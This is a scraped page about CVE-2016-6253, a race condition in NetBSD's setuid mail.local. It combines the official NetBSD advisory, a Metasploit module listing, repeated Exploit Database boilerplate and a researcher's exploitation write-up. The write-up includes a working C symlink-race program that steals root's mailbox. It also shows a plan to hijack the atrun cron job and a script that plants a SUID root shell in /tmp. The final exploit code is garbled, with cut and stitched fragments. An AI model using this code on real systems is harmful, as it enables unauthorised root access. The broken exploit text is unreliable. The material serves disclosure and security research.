##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

NetBSD Security Advisory 2016-006
=================================
Topic: Race condition in mail.local(8)
Version: NetBSD-current: affected prior to 2016-07-19
NetBSD 7.0 - 7.0.1: affected
NetBSD 6.1 - 6.1.5: affected
NetBSD 6.0 - 6.0.6: affected
Severity: Local user may be able to own any file or append arbitrary
data
Fixed: NetBSD-current: 2016-07-19
NetBSD-7 branch: 2016-07-19
NetBSD-7-0 branch: 2016-07-19
NetBSD-6 branch: 2016-07-19
NetBSD-6-1 branch: 2016-07-19
NetBSD-6-0 branch: 2016-07-19
Please note that NetBSD releases prior to 6.0 are no longer supported.
It is recommended that all users upgrade to a supported release.
Abstract
========
A race condition exists in the mail.local(8) (/usr/libexec/mail.local)
program which is setuid root. That may be exploited in order to change
the ownership of or append arbitrary data to an arbitrary file.
A malicious local user may exploit the race condition to acquire write
permissions to a critical system file, and leverage the situation to
acquire escalated privileges.
This vulnerability has been assigned CVE-2016-6253.
Technical Details
=================
The user mailbox (typically /var/mail/$USER) which is used to deliver a
message, is checked using lstat(2) to verify that the file is not a symlink.
Then if the file is not a symlink, it's opened. This is subject to a
symlink race. An attacker has a window between the lstat(2) and open(2)
calls during which she/he can create a symlink to an arbitrary file.
The mail.local program then will append arbitrary data or change the
ownership using fchown(2) to the file where the symlink points to.
Solutions and Workarounds
=========================
Potential workaround is to remove mail.local or turn off SUID bit from the
file. This program was used by sendmail(8) which is no longer shipped with
NetBSD (NetBSD uses postfix(1) as its MTA).
Binary update of affected versions (root is required to extract):
To apply a fixed version from a releng build, fetch a matching base.tgz
from nyftp.netbsd.org and extract the fixed binaries:
# cd /var/tmp
# ftp http://nyftp.netbsd.org/pub/NetBSD-daily////binary/sets/base.tgz
# cd /
# tar xzpf /var/tmp/base.tgz ./usr/libexec/mail.local
with the following replacements:
 = the release version you are using
 = the source date of the build. 20160719 and later will fit
 = your system's architecture
The following instructions describe how to upgrade your mail.local(8)
binaries by updating your source tree and rebuilding and
installing a new version of mail.local(8).
\* NetBSD-current:
Systems running NetBSD-current dated from before 2016-07-19
should be upgraded to NetBSD-current dated 2016-07-19 or later.
The following files/directories need to be updated from the
netbsd-current CVS branch (aka HEAD):
src/libexec/mail.local
To update from CVS, re-build, and re-install mail.local(8):
# cd src
# cvs update -d -P libexec/mail.local
# cd libexec/mail.local
# make USETOOLS=no cleandir dependall
# make USETOOLS=no install
\* NetBSD 7.\*:
Systems running NetBSD 7.\* sources dated from before
2016-07-19 should be upgraded from NetBSD 7.\* sources dated
2016-07-19 or later.
The following files/directories need to be updated from the
netbsd-7, netbsd-7-0 branches:
src/libexec/mail.local
To update from CVS, re-build, and re-install mail.local(8):
# cd src
# cvs update -r  -d -P libexec/mail.local
# cd libexec/mail.local
# make USETOOLS=no cleandir dependall
# make USETOOLS=no install
\* NetBSD 6.\*:
Systems running NetBSD 6.\* sources dated from before
2016-07-19 should be upgraded from NetBSD 6.\* sources dated
2016-07-19 or later.
The following files/directories need to be updated from the
netbsd-6, netbsd-6-1 or netbsd-6-0 branches:
src/libexec/mail.local
To update from CVS, re-build, and re-install mail.local(8):
# cd src
# cvs update -r  -d -P libexec/mail.local
# cd libexec/mail.local
# make USETOOLS=no cleandir dependall
# make USETOOLS=no install

### NetBSD mail.local Privilege Escalation

Disclosed
07/07/2016

Created
05/30/2018

#### Description

This module attempts to exploit a race condition in mail.local with SUID bit set on:
NetBSD 7.0 - 7.0.1 (verified on 7.0.1)
NetBSD 6.1 - 6.1.5
NetBSD 6.0 - 6.0.6
Successful exploitation relies on a crontab job with root privilege, which may take up to 10min to execute.

#### Author(s)

* h00die <mike@shorebreaksecurity.com>
* akat1

#### Platform

Unix

#### Architectures

cmd

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/local/netbsd_mail_local.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/unix/local/netbsd_mail_local
msf exploit(netbsd_mail_local) > show targets
    ...targets...
msf exploit(netbsd_mail_local) > set TARGET < target-id >
msf exploit(netbsd_mail_local) > show options
    ...show and set options...
msf exploit(netbsd_mail_local) > exploit
```

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

[Spawn your shell like it's 90s again!](?id=2)
2016-07-21 09:09:58
##### Spawn your shell like it's 90s again!

This article is a quick walk-through to gaining root privileges in the NetBSD,
since it's so 90s you can play Captain Jack [[3]](https://www.youtube.com/watch?v=boNRVXR7bqg), or [[4]](https://www.youtube.com/watch?v=YLND32bEbgI) [[5]](https://www.youtube.com/watch?v=s88xIW_SB7Q) if you prefer
polish disco, just to feel the atmosphere while reading. Really, do it! ;)

Abusing SUID files should be dead in 90s, but surprisingly it's still alive.
By auditing Coverity Scan reports for the NetBSD SUID files I accidentally found a Time To Check To Time To
Use [[1]](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use) issue in mail.local(8) which luckily can be turned into privilege
escalation! You may ask what's mail.local(8)... It simply delivers message from
standard input to chosen user mailbox - check man page if you wish to know
more. The utility appears also in other BSDs, but it seems that OpenBSD fixed
the issue almost 20 years ago and FreeBSD uses sendmail(8) which provides its own implementation.

##### The bug

The bug is placed in deliver() function of mail.local:
```
177 static int
178 deliver(int fd, char *name, int lockfile)
179 {
180 	struct stat sb;
181 	struct passwd pwres, *pw;
182 	char pwbuf[1024];
183 	int created, mbfd, nr, nw, off, rval=EX_OK, lfd=-1;
184 	char biffmsg[100], buf[8*1024], path[MAXPATHLEN], lpath[MAXPATHLEN];
185 	off_t curoff;
[...]
200 	(void)snprintf(path, sizeof path, "%s/%s", _PATH_MAILDIR, name);
[...]
213 	if (!(created = lstat(path, &sb)) &&
214 	    (sb.st_nlink != 1 || S_ISLNK(sb.st_mode))) {
215 		logwarn("%s: linked file", path);
216 		return(EX_OSERR);
217 	}
218
219 	if ((mbfd = open(path, O_APPEND|O_WRONLY|O_EXLOCK,
220 	    S_IRUSR|S_IWUSR)) < 0) {
221 		if ((mbfd = open(path, O_APPEND|O_CREAT|O_WRONLY|O_EXLOCK,
222 		    S_IRUSR|S_IWUSR)) < 0) {
223 			logwarn("%s: %s", path, strerror(errno));
224 			return(EX_OSERR);
225 		}
226 	}
[...]
262 	if (created)
263 		(void)fchown(mbfd, pw->pw_uid, pw->pw_gid);
264
265 	(void)fsync(mbfd);		/* Don't wait for update. */
266 	(void)close(mbfd);		/* Implicit unlock. */
[...]

```

The code creates path from \_PATH\_MAILDIR (which is "/var/mail/") and username
at line 200, then lstat is done at line 213, if file does not exist (or it's not a symlink)
the path is opened at line 219. What if somebody would quickly replace object between lstat(2) and open(2) under
the checked path? Well, then arbitrary file can be opened, some data will be
appended, and then, eventually, the ownership will be changed. It's the classical race condition example.

The cool thing about this particular issue is that no memory corruption issues
are involved, so we don't need to deal with PIE, ASLR and so on. Instead we
got pretty nice race, thus it's all about the timing.

##### Errr... so what? Time window is too small, they said!

No time window is too small to be exploited! It's just a matter of trying
hard enough. Let's analyze carefully the case that we have:

```
 mail.local                                                |attacker
 ----------------------------------------------------------+---------------------------------------------
 lstat() - returns ENOENT - the named file does not exist. |
                                                           | symlink() - an attacker creates symlink that
                                                           | points to a sensitive file.
 open() - opens sensitive file through symlink             |
 (...)                                                     |
 fchown() - changes owner to user                          |
                                                           | \o/ PROFIT \o/
```

The moment between lstat(2) and open(2) is our chance to plant malicious
symlink. This is a classic race condition example, you may think it could take
ages to trigger the above scenario, but in fact it can occur within a few
seconds. Let's steal /var/mail/root file:

```
shm@netbsd-dev ~ $ ls -al /var/mail/root
-rw-------  1 root  wheel  38 Jul 21 16:08 /var/mail/root

```

We need two workers. First is supposed to create symlinks, second is
responsible for executing mail.local(8).

```
shm@netbsd-dev ~ $ cat test.c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/stat.h>

#define STEALPATH       "/var/mail/root"
#define MAILBOX         "/var/mail/shm"

int
main() {
        int fd;
        struct stat sb;

        for(;;) {
                unlink(MAILBOX);
                symlink(STEALPATH, MAILBOX);
                sync();
                unlink(MAILBOX);
                fd = open(MAILBOX, O_CREAT, S_IRUSR | S_IWUSR);
                close(fd);
                sync();
                if (lstat(STEALPATH, &sb) == 0) {
                        if (sb.st_uid == getuid()) {
                                fprintf(stderr, "[+] won race!\n");
                                return 0;
                        }
                }
        }

        /* NOTREACHED */
        return 1;
}
shm@netbsd-dev ~ $ cc -o test test.c
shm@netbsd-dev ~ $ while true ; do echo x | /usr/libexec/mail.local shm 2> /dev/null ; done &
[3] 5084
shm@netbsd-dev ~ $ time ./test
[+] won race!

real    0m3.093s
user    0m0.000s
sys     0m2.987s
shm@netbsd-dev ~ $ ls -al /var/mail/root
-rw-------  1 shm  shm  77 Jul 21 16:12 /var/mail/root

```

Within few seconds, we're able to steal root's mailbox, not bad!

##### Uh I see, what's next?

So we can became an owner of any file in the system, using that possibility into
privilege escalation should be easy - actually, there are many ways to do it. One of them is to
own passwd, master.passwd and company in order to manipulate system accounts - but
tha intrusive and overcomplicated. Instead of this, let's see what's executed
repetitively by administrative accounts, own that and change its context to
get a shell.

Natural candidate is crontab(8), default tasks look as follows:

```
[...]
#minute	hour	mday	month	wday	command
#
*/10	*	*	*	*	/usr/libexec/atrun
#
# rotate log files every hour, if necessary
0	*	*	*	*	/usr/bin/newsyslog
#
# do daily/weekly/monthly maintenance
15	3	*	*	*	/bin/sh /etc/daily 2>&1 | tee /var/log/daily.out | sendmail -t
30	4	*	*	6	/bin/sh /etc/weekly 2>&1 | tee /var/log/weekly.out | sendmail -t
#30	5	1	*	*	/bin/sh /etc/monthly 2>&1 | tee /var/log/monthly.out | sendmail -t
[...]

Source: <https://nxr.netbsd.org/xref/src/etc/crontab>

```

Of course we do want to wait a month or even a day for shell spawn. The best
option is to change atrun(1), triggered every 10 minutes - which is
an acceptable time to wait for root privileges, isn't it?

What to execute? The simplest idea is to copy ksh to /tmp directory and set SUID
bit. Example script is uber simple:

```
#! /bin/sh
cp /bin/ksh /tmp/ksh
chmod +s /tmp/ksh
```

Upon this script is executed, we get SUIDed shell in /tmp, ksh doesn't drop
effective uid and gid, so we can get it 0 by using setuid(2) and setgid(2).

##### Putting things together

We have all the pieces, let's craft an exploit:
```
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>

                goto out;
        }

        size = strlen(script);
        if (size != fwrite(script, 1, strlen(script), fh)) {

        }

        return rv;
}

        FILE *in = NULL, *out = NULL;
        size_t size;
        int rv = 0, fd;

        in = fopen(from, "rb");
        if (create == 0)
                out = fopen(dest, "wb");
        else {
                fd = open(dest, O_WRONLY | O_EXCL | O_CREAT, S_IRUSR |
                    S_IWUSR);

                }
                out = fdopen(fd, "wb");
        }

        if (in == NULL || out == NULL) {
                rv = -1;
                goto out;
        }

        while ((size = fread(&buf, 1, sizeof(buf), in)) > 0) {
                if (fwrite(&buf, 1, size, in) != 0) {

##### Final words

NetBSD is an elegant operating system with many exciting features as rump(8)
or veriexec(8), bugs just happen! The best thing we can do, besides fixing
this particular vulnerability [[7]](http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc), is to get rid of SUIDs, like some of our
friends already did. But radical step requires major changes.

Hope to bring you back to the 90s. If this bug is older than you, I'm
sorry, you missed opportunity to live in the best decade in history of this planet.
OpenBSD left this bug in the 20th Century [[6]](http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/libexec/mail.local/mail.local.c.diff?r1=1.1&r2=1.2&f=h), just where it belongs.
Particularly I like few lines from this patch:

```
/* paranoia? */
if (fsb.st_nlink != 1 || S_ISLNK(fsb.st_mode)) {
		err(NOTFATAL, "%s: linked file", path);
		goto bad;
}
